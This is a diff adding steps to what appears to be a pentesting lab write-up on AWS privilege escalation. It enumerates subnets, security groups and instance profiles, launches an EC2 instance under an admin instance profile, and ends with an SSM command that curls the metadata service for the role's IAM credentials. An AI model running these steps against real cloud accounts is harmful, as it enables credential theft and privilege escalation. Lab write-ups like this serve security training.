@@ -35,6 +35,29 @@ The value obtained is `ami-07bf5557ac8caacca`
 Check the subnets available in the AWS account `aws ec2 describe-subnets --profile PTAcademyJllerena`
 ![image](https://user-images.githubusercontent.com/46797181/222877273-1e36b971-e35a-43c2-8a7f-01c189a9be89.png)
 
+Take note of subnet id `subnet-0c344c41445db179a` 
+
+Describe security groups `aws ec2 describe-security-groups --profile PTAcademyJllerena`
+![image](https://user-images.githubusercontent.com/46797181/222877654-4470573b-8865-42ed-badb-0189e7af4922.png)
+
+Take note of the security group ID `sg-085ec1c95a24f2950` 
+
+List instance profiles for the AWS account. `aws iam list-instance-profiles --profile PTAcademyJllerena` 
+![image](https://user-images.githubusercontent.com/46797181/222877770-11f75618-fae1-401e-a9b7-c33410cb64e2.png)
+
+Take note of instance profile name `ec2_admin`
+
+Start an ec2 instance using collected details. `aws ec2 run-instances --subnet-id subnet-0c344c41445db179a --image-id ami-07bf5557ac8caacca --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-085ec1c95a24f2950" --profile PTAcademyJllerena`
+
+![image](https://user-images.githubusercontent.com/46797181/222877971-1bafeef4-d464-4bdb-899c-69be1178e1db.png)
+
+Run commands on the remote ec2 instance using SSM. `aws ssm send-command \
+--document-name "AWS-RunShellScript" \
+--parameters 'commands=["curl
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
+--targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
+--comment "aws cli 1"
+
 
 
 
